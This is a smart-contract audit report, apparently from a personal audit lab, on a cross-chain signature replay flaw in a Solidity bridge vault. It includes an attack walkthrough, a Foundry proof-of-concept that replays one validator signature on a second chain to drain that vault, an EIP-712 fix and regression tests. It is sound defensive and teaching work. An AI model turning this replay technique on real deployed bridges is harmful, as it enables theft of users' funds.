# Security Audit Report: Cross-Chain Message Replay Attack

---

## Finding Summary

| Field | Detail |
| :--- | :--- |
| **Finding ID** | `AVIOR-CC-001` |
| **Title** | Missing Chain ID & Domain Separation Allows Cross-Chain Validator Signature Replay |
| **Severity** | **Critical** |
| **CVSS v3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (**Score: 10.0**) |
| **Status** | **Confirmed & Mitigated** |
| **Target Component** | Cross-Chain Bridge Endpoint (`CrossChainMessageVault`) |
| **Affected Source File** | [`src/CrossChainMessageVault.sol#L21-L36`](file:///c:/Users/dogga/My-first-smart-contract-audit-lab/src/CrossChainMessageVault.sol) |
| **Fixed Source File** | [`src/crosschain/CrossChainMessageVaultSecured.sol#L45-L95`](file:///c:/Users/dogga/My-first-smart-contract-audit-lab/src/crosschain/CrossChainMessageVaultSecured.sol) |
| **Exploit Test File** | [`test/CrossChainMessageVault.t.sol`](file:///c:/Users/dogga/My-first-smart-contract-audit-lab/test/CrossChainMessageVault.t.sol) |
| **Regression Test File** | [`test/regressions/CrossChainMessageVaultRegression.t.sol`](file:///c:/Users/dogga/My-first-smart-contract-audit-lab/test/regressions/CrossChainMessageVaultRegression.t.sol) |

---

## 1. Vulnerability Overview & Root Cause

### 1.1 Description
The `CrossChainMessageVault` contract functions as a multi-chain token withdrawal endpoint. Users initiate a withdrawal on a source chain and receive an ECDSA signature from the trusted `bridgeValidator`. The recipient then calls `executeCrossChainWithdrawal(to, amount, nonce, validatorSignature)` on the target destination chain to release funds.

However, the signature payload is generated using simple string packing:
```solidity
bytes32 messageHash = keccak256(abi.encodePacked(to, amount, nonce));
bytes32 ethSignedHash = MessageHashUtils.toEthSignedMessageHash(messageHash);
```

### 1.2 Root Cause Analysis
1. **Omission of Target Chain Binding:** The hashed payload does not include `block.chainid`. Consequently, a signature authorizing a withdrawal on Ethereum (ChainID 1) is mathematically identical to a signature authorizing a withdrawal on BNB Chain (ChainID 56), Arbitrum (ChainID 42161), or Polygon (ChainID 137).
2. **Omission of Contract Binding:** The payload does not bind `address(this)`, allowing cross-contract replay if a protocol deploys multiple vault instances.
3. **Isolated State Tracking:** The `executedMessages` mapping exists independently on each blockchain state. Executing a message on Chain A sets `executedMessages[messageHash] = true` on Chain A, but leaves Chain B's mapping completely unflagged (`false`).

---

## 2. Threat Model & Attack Preconditions

### 2.1 Threat Actor Profile
- **Attacker Privilege:** Completely unprivileged external user.
- **Capabilities:** Ability to request a legitimate cross-chain withdrawal or monitor the public mempool / transaction logs for validator signatures.
- **Capital Required:** Funds for one legitimate withdrawal on any supported EVM chain.

### 2.2 Attack Surface
- **Entry Point:** `CrossChainMessageVault.executeCrossChainWithdrawal(address to, uint256 amount, uint256 nonce, bytes calldata validatorSignature)`
- **Trust Boundary Violated:** Cryptographic binding between cross-chain message intent and physical target EVM execution environment.

---

## 3. Step-by-Step Attack Scenario

1. **Setup:** Protocol deploys `CrossChainMessageVault` on Ethereum (ChainID 1) with 10 ETH and on BSC (ChainID 56) with 10 ETH, both authorized by validator address `0x7A21B...`.
2. **Step 1 (Legitimate Request):** Attacker legitimate bridges 10 ETH on Ethereum. The validator signs message `(attacker, 10 ether, 1337)`.
3. **Step 2 (Ethereum Execution):** Attacker calls `ethVault.executeCrossChainWithdrawal(attacker, 10 ether, 1337, sig)` on Ethereum. Ethereum vault transfers 10 ETH to attacker; `executedMessages[msgHash]` on Ethereum becomes `true`.
4. **Step 3 (Replay on BSC):** Attacker switches to BSC (ChainID 56) and calls `bscVault.executeCrossChainWithdrawal(attacker, 10 ether, 1337, sig)` using the exact same signature.
5. **Step 4 (Validation on BSC):** `bscVault` computes `keccak256(abi.encodePacked(attacker, 10 ether, 1337))`. The hash is identical. `signer == bridgeValidator` passes. `executedMessages[msgHash]` is `false` on BSC.
6. **Step 5 (Double Extraction):** `bscVault` pays out an additional 10 ETH from its treasury, resulting in a 100% loss of the BSC vault treasury.

---

## 4. Minimal Reproducible Proof of Concept (PoC)

### 4.1 Reproducing Code Snippet
From [`test/CrossChainMessageVault.t.sol`](file:///c:/Users/dogga/My-first-smart-contract-audit-lab/test/CrossChainMessageVault.t.sol):
```solidity
function test_CrossChainMessageReplayExploit() public {
    vm.chainId(1);
    bytes32 msgHashEth = keccak256(abi.encodePacked(attacker, 10 ether, 1337));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(VALIDATOR_KEY, MessageHashUtils.toEthSignedMessageHash(msgHashEth));
    bytes memory signature = abi.encodePacked(r, s, v);

    // Execute on Ethereum
    ethVault.executeCrossChainWithdrawal(attacker, 10 ether, 1337, signature);
    assertEq(address(ethVault).balance, 0);

    // Replay on BSC (ChainID 56)
    vm.chainId(56);
    bscVault.executeCrossChainWithdrawal(attacker, 10 ether, 1337, signature);
    assertEq(address(bscVault).balance, 0);
    assertEq(attacker.balance, 20 ether);
}
```

### 4.2 Exact Execution Command
```bash
forge test -vvv --match-test test_CrossChainMessageReplayExploit
```

### 4.3 Verified Test Execution Output
```text
Ran 1 test for test/CrossChainMessageVault.t.sol:CrossChainMessageVaultTest
[PASS] test_CrossChainMessageReplayExploit() (gas: 159630)
Logs:
  === REPORT-GRADE POC LOGS ===
  BSC Target Vault Initial Balance : 10000000000000000000
  BSC Target Vault Final Balance   : 0
  Replayed Cross-Chain Loss        : 10000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.00ms
```

---

## 5. Realistic Impact & Risk Assessment

- **Direct Financial Impact:** Drains $100\%$ of pool liquidity across all secondary deployed EVM networks where the same validator is active.
- **Cross-Chain Solvency:** Causes catastrophic bridge insolvency; deposits on one chain do not back mints or releases on the other chains.
- **Severity Score:** Maximum Critical (10.0) due to unprivileged network-wide exploitability with immediate capital drain.

---

## 6. Recommended Remediation

### 6.1 Architectural Solution
1. **Implement EIP-712 Domain Separation:** Utilize OpenZeppelin's `EIP712` contract, binding the signing domain to `block.chainid` and `address(this)`.
2. **Explicit Chain Validation:** Require `destinationChainId == block.chainid`.
3. **Sequential Nonce Enforcement:** Implement per-user or per-destination monotonic nonces.

### 6.2 Remediation Code Diff
```diff
- contract CrossChainMessageVault {
+ contract CrossChainMessageVaultSecured is EIP712, ReentrancyGuard {

+     bytes32 public constant WITHDRAWAL_TYPEHASH = keccak256(
+         "WithdrawalMessage(uint256 sourceChainId,uint256 destinationChainId,address destinationContract,address recipient,uint256 amount,uint256 nonce)"
+     );

-     function executeCrossChainWithdrawal(address to, uint256 amount, uint256 nonce, bytes calldata validatorSignature) external {
-         bytes32 messageHash = keccak256(abi.encodePacked(to, amount, nonce));
-         bytes32 ethSignedHash = MessageHashUtils.toEthSignedMessageHash(messageHash);
-         address signer = ethSignedHash.recover(validatorSignature);

+     function executeCrossChainWithdrawal(
+         uint256 sourceChainId,
+         uint256 destinationChainId,
+         address recipient,
+         uint256 amount,
+         uint256 nonce,
+         bytes calldata validatorSignature
+     ) external nonReentrant {
+         if (destinationChainId != block.chainid) revert InvalidDestinationChain();
+         bytes32 structHash = keccak256(abi.encode(WITHDRAWAL_TYPEHASH, sourceChainId, destinationChainId, address(this), recipient, amount, nonce));
+         bytes32 digest = _hashTypedDataV4(structHash);
+         address signer = digest.recover(validatorSignature);
```

---

## 7. Regression Validation & Invariant Testing

### 7.1 Regression Test Outcome
Command executed:
```bash
forge test -vvv --match-contract CrossChainMessageVaultRegressionTest
```
Output:
```text
Ran 4 tests for test/regressions/CrossChainMessageVaultRegression.t.sol:CrossChainMessageVaultRegressionTest
[PASS] testFuzz_DestinationChainMismatchAlwaysReverts(uint256,uint256) (runs: 256, μ: 42566, ~: 42503)
[PASS] test_Regression_CrossChainReplayFailsOnDifferentChain() (gas: 197099)
Logs:
  === REGRESSION CONFIRMED: CROSS-CHAIN REPLAY BLOCKED BY EIP-712 DOMAIN SEPARATION ===

[PASS] test_Regression_SameChainDuplicateReplayFails() (gas: 183911)
[PASS] test_Regression_ValidWithdrawalSucceedsOnTargetChain() (gas: 150276)
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 75.33ms
```
The test confirms that when an attacker captures a valid Ethereum signature and broadcasts it on BSC (ChainID 56), execution unconditionally reverts with `InvalidDestinationChain()` or `InvalidValidatorSignature()`, preserving 100% of BSC vault funds.

---

## 8. Known Limitations & Residual Risks

- **Validator Compromise:** EIP-712 prevents replay attacks across chains, but protocol security still depends on the validator key `0x7A21B...` remaining secure. A multi-signature validator set or proof-of-stake relayer committee is recommended for production.
